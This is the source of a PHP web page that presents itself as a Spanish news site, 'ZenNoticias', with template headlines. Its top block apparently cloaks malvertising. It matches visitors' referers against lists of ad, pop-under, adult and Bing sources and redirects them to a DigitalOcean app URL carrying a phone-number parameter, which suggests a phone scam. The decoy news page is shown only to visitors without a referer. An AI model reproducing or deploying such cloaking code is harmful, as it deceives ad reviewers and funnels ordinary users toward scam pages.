<?php
    $referers=array('displayvertising','premiumvertising','cdn4ads','blockadsnot','xadsmart','visariomedia','intellipopup','antiadblocksystems','intelligenceadx','popads','txrhpjddhbal','afdrivovoq','betteradsystem','bnohewjt','displayvertising','ehpvvxyp','fepgdpebyr','iezptsoc','jpzvrsuwdavpjw','qogilljcxwvrhj','lghqdjhilj','mjeltachv','mjzrebrjty','oofycyur','rsnjmocfenkewq','xadsmart','ugdffrszmrapj','pbxopblttvorhd','mdghnrtegwuqar','pbyvehcz','thtpxwnqfx','awtqbjylk','dencejvlq','hjfonyiuo','paoukgnssmkeys','uaputgtwlhkmtr','mhrpusbstm','bponxqlit','hoiiodacdsmro','hqduejsycx','ouzrqrzktv','mrflvyizjr','uduhytyllobm','jozvmvxi','sruzefwboxu','mrflvyizjrkytj');

    $referers_popcash=array('rapolok','alfad','cabhwq','popcash','gocolow','viowrel','npcad','gecl','barlo','npcta','decpo','srvpcn','ponk','symoqecnefjj','asopn','norymo','hqwa','pctv','baidu','jwalf','ftwpcn','nuqwe','dlivertraffic','jeckear','hkuypnhpafbuyy','ovqds','bioeesrqti','ciazdymfepv','rgrd','posawaj','netund','mtinsqq','miluwo');

    $referers_maven=array('recode','linkpc','line','porn','sex','torrent','xxx','fuck','jerk','tube','jhoncj','tiny','teen','nude','torlock','marazma','isgost','falkwo','marazma');

    $referers_bing=array('yahoo','outlook','msn','becovi','bing');

    $lanzar=true;
   //$dominio_m='urchin-app-ykwwi.ondigitalocean.app/?phone=910-971-803'; //es 910
   // $dominio_m='urchin-app-2-udbgy.ondigitalocean.app/?phone=919-610-587'; //es 919
   $dominio_m='whale-app-z8c92.ondigitalocean.app/?phone=01-87-65-31-10'; // fr 919

    $encontrado=true;
    if ($_SERVER["HTTP_REFERER"]!='' && $lanzar){
        foreach ($referers as $referer){
            $pos = strpos($_SERVER["HTTP_REFERER"], $referer);
            if ($pos === false) {
                    //la cadena no esta
            } else {
                $encontrado=true;
                break;
            }
        }
        if ($encontrado){

        }

        #Buscar PopCash
        if (!$encontrado){
          foreach ($referers_popcash as $referer){
              $pos = strpos($_SERVER["HTTP_REFERER"], $referer);
              if ($pos === false) {
                      //la cadena no esta
              } else {
                  $encontrado=true;
                  $and='&popcash=1';
                  break;
              }
          }
        }

        #Buscar Maven
        if (!$encontrado){
          foreach ($referers_maven as $referer){
              $pos = strpos($_SERVER["HTTP_REFERER"], $referer);
              if ($pos === false) {
                      //la cadena no esta
              } else {
                  $encontrado=true;
                  $and='&maven=1';
                  break;
              }
          }
        }

        #Buscar Bing
        if (!$encontrado){
          foreach ($referers_bing as $referer){
              $pos = strpos($_SERVER["HTTP_REFERER"], $referer);
              if ($pos === false) {
                      //la cadena no esta
              } else {
                  $encontrado=true;
                  $and='&bing=1';
                  break;
              }
          }

          if ($_REQUEST['msclkid']!=''){
            $encontrado=true;
            $and='&bing=1&utm_term='.$_REQUEST['utm_term'];
          }else if ($_REQUEST['utm_source']=='bing' && $_REQUEST['ads']=='bing' && $_REQUEST['utm_campaign']=='Mizza'){
            $encontrado=true;
            $and='&bing=1&source=display';
          }else if ($_REQUEST['utm_source']=='bing' && $_REQUEST['bing']==1 && $_REQUEST['utm_campaign']=='Display'){
            $encontrado=true;
            $and='&bing=1&source=display';
          }
        }

        
    }else{
      if ($_REQUEST['utm_source']=='bing' && $_REQUEST['bing']==1 && $_REQUEST['utm_campaign']=='display'){
        #Display Bing sin referer
        $encontrado=true;
        $and='&bing=1&source=display';
        $_SERVER["HTTP_REFERER"]='bing';
      }
      
    }



    if ($encontrado){
        $referer=base64_encode($_SERVER["HTTP_REFERER"]);
        header("Location: http://".$dominio_m."&site_source=campaign&popads=1".$and."&browser=".$_REQUEST['browser']."&campaign=".$_REQUEST['campaign']."&device=".$_REQUEST['device']."&referer=".$referer);
        exit();
    }else{
      if ($_SERVER["HTTP_REFERER"]!==''){
        /*include 'debug/functions-tio.php';
        $conexion=conectar_bd();
        insert_debug($conexion);
        cerrar_bd($conexion);*/
      }
    }


?>


<!DOCTYPE html>
<html lang="en">

  <!-- Hotjar Tracking Code for mortgocus.site -->
  <script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:3659433,hjsv:6};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
</script>


<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MHNG63W6');</script>
<!-- End Google Tag Manager -->

<!-- Google tag (gtag.js) -->
<script async="" src="gtag/js?id=G-5ZFB23XX42"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-5ZFB23XX42');
</script>

<div class="cookie-consent-banner" id="cookie-banner" style="display: none">
  <div class="cookie-consent-banner__inner">
    <div class="cookie-consent-banner__copy">
      <div class="cookie-consent-banner__header">THIS WEBSITE USES COOKIES</div>
      <div class="cookie-consent-banner__description">We use cookies to personalise content and ads, to provide social media features and to analyse our traffic. We also share information about your use of our site with our social media, advertising and analytics partners who may combine it with other information that you’ve provided to them or that they’ve collected from your use of their services. You consent to our cookies if you continue to use our website.</div>
    </div>

    <div class="cookie-consent-banner__actions">
      
      <a href="#" class="cookie-consent-banner__cta" id="confirm" onclick="myFunction()">
        OK
      </a>
      
      <a href="#" class="cookie-consent-banner__cta cookie-consent-banner__cta--secondary" id="close" onclick="myClose()">
        Decline
      </a>
      
    </div>
  </div>
</div>

    <script type="text/javascript">
      
      if (localStorage.getItem('cookieSeen1') != 'shown') {
        document.getElementById("cookie-banner").style.display = 'flex';		
      };
      
      $(".close").click(function() {	  
        $('.cookie-banner').fadeOut();	  
      })
      
      function myFunction() {
        var x = document.getElementById("cookie-banner");
        if (x.style.display === "none") {
        x.style.display = "block";
        } else {
        x.style.display = "none";
        window.localStorage.setItem('cookieSeen1', 'shown');
        }
        }
        function myClose() {
        var x = document.getElementById("cookie-banner");
        x.style.display = "none";
        }
    </script> 


<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>ZenNoticias - Index</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="assets/img/favicon.png" rel="icon">
  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=EB+Garamond:wght@400;500&family=Inter:wght@400;500&family=Playfair+Display:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/aos/aos.css" rel="stylesheet">

  <!-- Template Main CSS Files -->
  <link href="assets/css/variables.css" rel="stylesheet">
  <link href="assets/css/main.css" rel="stylesheet">

  <!-- =======================================================
  * Template Name: ZenNoticias
  * Updated: Sep 18 2023 with Bootstrap v5.3.2
  * Template URL: https://bootstrapmade.com/ZenNoticias-bootstrap-blog-template/
  * Author: BootstrapMade.com
  * License: https:///bootstrapmade.com/license/
  ======================================================== -->
</head>

<body>

  <!-- ======= Header ======= -->
  <header id="header" class="header d-flex align-items-center fixed-top">
    <div class="container-fluid container-xl d-flex align-items-center justify-content-between">

      <a href="index.html" class="logo d-flex align-items-center">
        <!-- Uncomment the line below if you also wish to use an image logo -->
        <!-- <img src="assets/img/logo.png" alt=""> -->
        <h1>ZenNoticias</h1>
      </a>

      <nav id="navbar" class="navbar">
        <ul>
          <li><a href="index.html">Inicio</a></li>
          <li><a href="privacidad.html">Privacidad</a></li>


          <li><a href="aviso.html">Aviso legal</a></li>
          <li><a href="contact.html">Contacto</a></li>
        </ul>
      </nav><!-- .navbar -->

      <div class="position-relative">
        <a href="#" class="mx-2"><span class="bi-facebook"></span></a>
        <a href="#" class="mx-2"><span class="bi-twitter"></span></a>
        <a href="#" class="mx-2"><span class="bi-instagram"></span></a>

        <a href="#" class="mx-2 js-search-open"><span class="bi-search"></span></a>
        <i class="bi bi-list mobile-nav-toggle"></i>

        <!-- ======= Search Form ======= -->
        <div class="search-form-wrap js-search-form-wrap">
          <form action="search-result.html" class="search-form">
            <span class="icon bi-search"></span>
            <input type="text" placeholder="Search" class="form-control">
            <button class="btn js-search-close"><span class="bi-x"></span></button>
          </form>
        </div><!-- End Search Form -->

      </div>

    </div>

  </header><!-- End Header -->

  <main id="main">

    <!-- ======= Hero Slider Section ======= -->
    <section id="hero-slider" class="hero-slider">
      <div class="container-md" data-aos="fade-in">
        <div class="row">
          <div class="col-12">
            <div class="swiper sliderFeaturedPosts">
              <div class="swiper-wrapper">
                <div class="swiper-slide">
                  <a href="single-post.html" class="img-bg d-flex align-items-end" style="background-image: url('assets/img/post-slide-1.jpg');">
                    <div class="img-bg-inner">
                      <h2>El Premio Sájarov para Mahsa Amini y en honor a la lucha de las mujeres iraníes</h2>
                      
                    </div>
                  </a>
                </div>

                <div class="swiper-slide">
                  <a href="single-post.html" class="img-bg d-flex align-items-end" style="background-image: url('assets/img/post-slide-2.jpg');">
                    <div class="img-bg-inner">
                      <h2>La UE debate un proyecto de ley sobre detección de contenidos pedófilos</h2>
                    </div>
                  </a>
                </div>

                <div class="swiper-slide">
                  <a href="single-post.html" class="img-bg d-flex align-items-end" style="background-image: url('assets/img/post-slide-3.jpg');">
                    <div class="img-bg-inner">
                      <h2>Gaza: Egipto anuncia el paso ‘duradero’ de la ayuda humanitaria a través de Rafah</h2>
                    </div>
                  </a>
                </div>

                <div class="swiper-slide">
                  <a href="single-post.html" class="img-bg d-flex align-items-end" style="background-image: url('assets/img/post-slide-4.jpg');">
                    <div class="img-bg-inner">
                      <h2>¿El conflicto israelí-palestino se extiende al Líbano?</h2>
                    </div>
                  </a>
                </div>
              </div>
              <div class="custom-swiper-button-next">
                <span class="bi-chevron-right"></span>
              </div>
              <div class="custom-swiper-button-prev">
                <span class="bi-chevron-left"></span>
              </div>

              <div class="swiper-pagination"></div>
            </div>
          </div>
        </div>
      </div>
    </section><!-- End Hero Slider Section -->

    <!-- ======= Post Grid Section ======= -->
    <section id="posts" class="posts">
      <div class="container" data-aos="fade-up">
        <div class="row g-5">
          <div class="col-lg-4">
            <div class="post-entry-1 lg">
              <a href="single-post.html"><img src="assets/img/post-landscape-1.jpg" alt="" class="img-fluid"></a>
              <div class="post-meta"><span class="date">Alemania</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2><a href="single-post.html">Alemania estaría importando petróleo ruso a pesar de las sanciones europeas</a></h2>

              <div class="d-flex align-items-center author">
                <div class="photo"><img src="assets/img/person-1.jpg" alt="" class="img-fluid"></div>
                <div class="name">
                  <h3 class="m-0 p-0">Cameron Williamson</h3>
                </div>
              </div>
            </div>

          </div>

          <div class="col-lg-8">
            <div class="row g-5">
              <div class="col-lg-4 border-start custom-border">
                <div class="post-entry-1">
                  <a href="single-post.html"><img src="assets/img/post-landscape-2.jpg" alt="" class="img-fluid"></a>
                  <div class="post-meta"><span class="date">Sport</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
                  <h2><a href="single-post.html">En las universidades de California, los profesores deberán dar pruebas de antirracismo e inclusión</a></h2>
                </div>
                <div class="post-entry-1">
                  <a href="single-post.html"><img src="assets/img/post-landscape-5.jpg" alt="" class="img-fluid"></a>
                  <div class="post-meta"><span class="date">Comida</span> <span class="mx-1">&bullet;</span> <span>Octubre 23</span></div>
                  <h2><a href="single-post.html">¿Cómo evitar distracciones y mantenerse concentrado durante las videollamadas?</a></h2>
                </div>
                <div class="post-entry-1">
                  <a href="single-post.html"><img src="assets/img/post-landscape-7.jpg" alt="" class="img-fluid"></a>
                  <div class="post-meta"><span class="date">Diseño</span> <span class="mx-1">&bullet;</span> <span>Mar 15th '22</span></div>
                  <h2><a href="single-post.html">¿Por qué Craigslist Tampa es uno de los lugares más interesantes de la Web?</a></h2>
                </div>
              </div>
              <div class="col-lg-4 border-start custom-border">
                <div class="post-entry-1">
                  <a href="single-post.html"><img src="assets/img/post-landscape-3.jpg" alt="" class="img-fluid"></a>
                  <div class="post-meta"><span class="date">Iran</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
                  <h2><a href="single-post.html">El Premio Sájarov para Mahsa Amini y en honor a la lucha de las mujeres iraníes</a></h2>
                </div>
                <div class="post-entry-1">
                  <a href="single-post.html"><img src="assets/img/post-landscape-6.jpg" alt="" class="img-fluid"></a>
                  <div class="post-meta"><span class="date">Tech</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
                  <h2><a href="single-post.html">10 trucos que toda madre trabajadora debería conocer y que le cambiarán la vida</a></h2>
                </div>
                <div class="post-entry-1">
                  <a href="single-post.html"><img src="assets/img/post-landscape-8.jpg" alt="" class="img-fluid"></a>
                  <div class="post-meta"><span class="date">Viajar</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
                  <h2><a href="single-post.html">5 excelentes consejos de inicio para fundadoras</a></h2>
                </div>
              </div>

              <!-- Trending Section -->
              <div class="col-lg-4">

                <div class="trending">
                  <h3>Trending</h3>
                  <ul class="trending-post">
                    <li>
                      <a href="single-post.html">
                        <span class="number">1</span>
                        <h3>Las mejores mascarillas caseras para el rostro (mantén alejadas las espinillas)</h3>
                        <span class="author">Jane Cooper</span>
                      </a>
                    </li>
                    <li>
                      <a href="single-post.html">
                        <span class="number">2</span>
                        <h3>17 imágenes de cabello de longitud media en capas que inspirarán tu nuevo corte de cabello</h3>
                        <span class="author">Wade Warren</span>
                      </a>
                    </li>
                    <li>
                      <a href="single-post.html">
                        <span class="number">3</span>
                        <h3>13 poemas asombrosos de Shel Silverstein con valiosas lecciones de vida</h3>
                        <span class="author">Esther Howard</span>
                      </a>
                    </li>
                    <li>
                      <a href="single-post.html">
                        <span class="number">4</span>
                        <h3>9 peinados medio arriba/mitad abajo para cabello largo y mediano</h3>
                        <span class="author">Cameron Williamson</span>
                      </a>
                    </li>
                    <li>
                      <a href="single-post.html">
                        <span class="number">5</span>
                        <h3>Seguro de vida y embarazo: una guía para madres trabajadoras</h3>
                        <span class="author">Jenny Wilson</span>
                      </a>
                    </li>
                  </ul>
                </div>

              </div> <!-- End Trending Section -->
            </div>
          </div>

        </div> <!-- End .row -->
      </div>
    </section> <!-- End Post Grid Section -->

    <!-- ======= Cultura Category Section ======= -->
    <section class="category-section">
      <div class="container" data-aos="fade-up">

        <div class="section-header d-flex justify-content-between align-items-center mb-5">
          <h2>Cultura</h2>
        </div>

        <div class="row">
          <div class="col-md-9">

            <div class="d-lg-flex post-entry-2">
              <a href="single-post.html" class="me-4 thumbnail mb-4 mb-lg-0 d-inline-block">
                <img src="assets/img/post-landscape-6.jpg" alt="" class="img-fluid">
              </a>
              <div>
                <div class="post-meta"><span class="date">Cultura</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
                <h3><a href="single-post.html">¿Qué está haciendo ahora el hijo del entrenador de fútbol John Gruden, Deuce Gruden?</a></h3>
                <div class="d-flex align-items-center author">
                  <div class="photo"><img src="assets/img/person-2.jpg" alt="" class="img-fluid"></div>
                  <div class="name">
                    <h3 class="m-0 p-0">Wade Warren</h3>
                  </div>
                </div>
              </div>
            </div>

            <div class="row">
              <div class="col-lg-4">
                <div class="post-entry-1 border-bottom">
                  <a href="single-post.html"><img src="assets/img/post-landscape-1.jpg" alt="" class="img-fluid"></a>
                  <div class="post-meta"><span class="date">Alemania</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
                  <h2 class="mb-2"><a href="single-post.html">Alemania estaría importando petróleo ruso a pesar de las sanciones europeas</a></h2>
                  <span class="author mb-3 d-block">Jenny Wilson</span>
                  <p class="mb-4 d-block"></p>
                </div>

                <div class="post-entry-1">
                  <div class="post-meta"><span class="date">Cultura</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
                  <h2 class="mb-2"><a href="single-post.html">5 excelentes consejos de inicio para fundadoras</a></h2>
                  <span class="author mb-3 d-block">Jenny Wilson</span>
                </div>
              </div>
              <div class="col-lg-8">
                <div class="post-entry-1">
                  <a href="single-post.html"><img src="assets/img/post-landscape-2.jpg" alt="" class="img-fluid"></a>
                  <div class="post-meta"><span class="date">Cultura</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
                  <h2 class="mb-2"><a href="single-post.html">¿Cómo evitar distracciones y mantenerse concentrado durante las videollamadas?</a></h2>
                  <span class="author mb-3 d-block">Jenny Wilson</span>
                  <p class="mb-4 d-block"></p>
                </div>
              </div>
            </div>
          </div>

          <div class="col-md-3">
            <div class="post-entry-1 border-bottom">
              <div class="post-meta"><span class="date">Cultura</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2 class="mb-2"><a href="single-post.html">¿Cómo evitar distracciones y mantenerse concentrado durante las videollamadas?</a></h2>
              <span class="author mb-3 d-block">Jenny Wilson</span>
            </div>

            <div class="post-entry-1 border-bottom">
              <div class="post-meta"><span class="date">Cultura</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2 class="mb-2"><a href="single-post.html">17 imágenes de cabello de longitud media en capas que inspirarán tu nuevo corte de cabello</a></h2>
              <span class="author mb-3 d-block">Jenny Wilson</span>
            </div>

            <div class="post-entry-1 border-bottom">
              <div class="post-meta"><span class="date">Cultura</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2 class="mb-2"><a href="single-post.html">9 peinados medio arriba/mitad abajo para cabello largo y mediano</a></h2>
              <span class="author mb-3 d-block">Jenny Wilson</span>
            </div>

            <div class="post-entry-1 border-bottom">
              <div class="post-meta"><span class="date">Cultura</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2 class="mb-2"><a href="single-post.html">Seguro de vida y embarazo: una guía para madres trabajadoras</a></h2>
              <span class="author mb-3 d-block">Jenny Wilson</span>
            </div>

            <div class="post-entry-1 border-bottom">
              <div class="post-meta"><span class="date">Cultura</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2 class="mb-2"><a href="single-post.html">Las mejores mascarillas caseras para el rostro (mantén alejadas las espinillas)</a></h2>
              <span class="author mb-3 d-block">Jenny Wilson</span>
            </div>

            <div class="post-entry-1 border-bottom">
              <div class="post-meta"><span class="date">Cultura</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2 class="mb-2"><a href="single-post.html">10 trucos que toda madre trabajadora debería conocer y que le cambiarán la vida</a></h2>
              <span class="author mb-3 d-block">Jenny Wilson</span>
            </div>
          </div>
        </div>
      </div>
    </section><!-- End Cultura Category Section -->

    <!-- ======= Negocios Category Section ======= -->
    <section class="category-section">
      <div class="container" data-aos="fade-up">

        <div class="section-header d-flex justify-content-between align-items-center mb-5">
          <h2>Negocios</h2>
        </div>

        <div class="row">
          <div class="col-md-9 order-md-2">

            <div class="d-lg-flex post-entry-2">
              <a href="single-post.html" class="me-4 thumbnail d-inline-block mb-4 mb-lg-0">
                <img src="assets/img/post-landscape-3.jpg" alt="" class="img-fluid">
              </a>
              <div>
                <div class="post-meta"><span class="date">Negocios</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
                <h3><a href="single-post.html">¿Qué está haciendo ahora el hijo del entrenador de fútbol John Gruden, Deuce Gruden?</a></h3>
                <div class="d-flex align-items-center author">
                  <div class="photo"><img src="assets/img/person-4.jpg" alt="" class="img-fluid"></div>
                  <div class="name">
                    <h3 class="m-0 p-0">Wade Warren</h3>
                  </div>
                </div>
              </div>
            </div>

            <div class="row">
              <div class="col-lg-4">
                <div class="post-entry-1 border-bottom">
                  <a href="single-post.html"><img src="assets/img/post-landscape-5.jpg" alt="" class="img-fluid"></a>
                  <div class="post-meta"><span class="date">Alemania</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
                  <h2 class="mb-2"><a href="single-post.html">Alemania estaría importando petróleo ruso a pesar de las sanciones europeas</a></h2>
                  <span class="author mb-3 d-block">Jenny Wilson</span>
                </div>

                <div class="post-entry-1">
                  <div class="post-meta"><span class="date">Negocios</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
                  <h2 class="mb-2"><a href="single-post.html">5 excelentes consejos de inicio para fundadoras</a></h2>
                  <span class="author mb-3 d-block">Jenny Wilson</span>
                </div>
              </div>
              <div class="col-lg-8">
                <div class="post-entry-1">
                  <a href="single-post.html"><img src="assets/img/post-landscape-7.jpg" alt="" class="img-fluid"></a>
                  <div class="post-meta"><span class="date">Negocios</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
                  <h2 class="mb-2"><a href="single-post.html">¿Cómo evitar distracciones y mantenerse concentrado durante las videollamadas?</a></h2>
                  <span class="author mb-3 d-block">Jenny Wilson</span>
                </div>
              </div>
            </div>
          </div>
          <div class="col-md-3">
            <div class="post-entry-1 border-bottom">
              <div class="post-meta"><span class="date">Negocios</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2 class="mb-2"><a href="single-post.html">¿Cómo evitar distracciones y mantenerse concentrado durante las videollamadas?</a></h2>
              <span class="author mb-3 d-block">Jenny Wilson</span>
            </div>

            <div class="post-entry-1 border-bottom">
              <div class="post-meta"><span class="date">Negocios</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2 class="mb-2"><a href="single-post.html">17 imágenes de cabello de longitud media en capas que inspirarán tu nuevo corte de cabello</a></h2>
              <span class="author mb-3 d-block">Jenny Wilson</span>
            </div>

            <div class="post-entry-1 border-bottom">
              <div class="post-meta"><span class="date">Negocios</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2 class="mb-2"><a href="single-post.html">9 peinados medio arriba/mitad abajo para cabello largo y mediano</a></h2>
              <span class="author mb-3 d-block">Jenny Wilson</span>
            </div>

            <div class="post-entry-1 border-bottom">
              <div class="post-meta"><span class="date">Negocios</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2 class="mb-2"><a href="single-post.html">Seguro de vida y embarazo: una guía para madres trabajadoras</a></h2>
              <span class="author mb-3 d-block">Jenny Wilson</span>
            </div>

            <div class="post-entry-1 border-bottom">
              <div class="post-meta"><span class="date">Negocios</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2 class="mb-2"><a href="single-post.html">Las mejores mascarillas caseras para el rostro (mantén alejadas las espinillas)</a></h2>
              <span class="author mb-3 d-block">Jenny Wilson</span>
            </div>

            <div class="post-entry-1 border-bottom">
              <div class="post-meta"><span class="date">Negocios</span> <span class="mx-1">&bullet;</span> <span>Octubre23</span></div>
              <h2 class="mb-2"><a href="single-post.html">10 trucos que toda madre trabajadora debería conocer y que le cambiarán la vida</a></h2>
              <span class="author mb-3 d-block">Jenny Wilson</span>
            </div>
          </div>
        </div>
      </div>
    </section><!-- End Negocios Category Section -->


  </main><!-- End #main -->

  <!-- ======= Footer ======= -->
  <footer id="footer" class="footer">

    <div class="footer-content">
      <div class="container">

        <div class="row g-5">
          <div class="col-lg-4">
            <h3 class="footer-heading">Sobre Zen Noticias</h3>
            <p><a href="about.html" class="footer-link-more">leer Mas</a></p>
          </div>
          <div class="col-6 col-lg-2">
            <h3 class="footer-heading">Navigation</h3>
            <ul class="footer-links list-unstyled">
              <li><a href="index.html"><i class="bi bi-chevron-right"></i> Inicio</a></li>
              <li><a href="aviso.html"><i class="bi bi-chevron-right"></i> Aviso Legal</a></li>
              <li><a href="privacidad.html"><i class="bi bi-chevron-right"></i> Privacidad</a></li>
          
              <li><a href="contact.html"><i class="bi bi-chevron-right"></i> Contacto</a></li>
            </ul>
          </div>

        </div>
      </div>
    </div>

    <div class="footer-legal">
      <div class="container">

        <div class="row justify-content-between">
          <div class="col-md-6 text-center text-md-start mb-3 mb-md-0">
            <div class="copyright">
              © Copyright <strong><span>ZenNoticias</span></strong>. All Rights Reserved
            </div>

            <div class="credits">
              <!-- All the links in the footer should remain intact. -->
              <!-- You can delete the links only if you purchased the pro version. -->
              <!-- Licensing information: https://bootstrapmade.com/license/ -->
              <!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/herobiz-bootstrap-Negocios-template/ -->
            
            </div>

          </div>

          <div class="col-md-6">
            <div class="social-links mb-3 mb-lg-0 text-center text-md-end">
              <a href="#" class="twitter"><i class="bi bi-twitter"></i></a>
              <a href="#" class="facebook"><i class="bi bi-facebook"></i></a>
              <a href="#" class="instagram"><i class="bi bi-instagram"></i></a>
              <a href="#" class="google-plus"><i class="bi bi-skype"></i></a>
              <a href="#" class="linkedin"><i class="bi bi-linkedin"></i></a>
            </div>

          </div>

        </div>

      </div>
    </div>

  </footer>

  <a href="#" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

  <!-- Vendor JS Files -->
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="assets/vendor/aos/aos.js"></script>
  <script src="assets/vendor/php-email-form/validate.js"></script>

  <!-- Template Main JS File -->
  <script src="assets/js/main.js"></script>

</body>

</html>
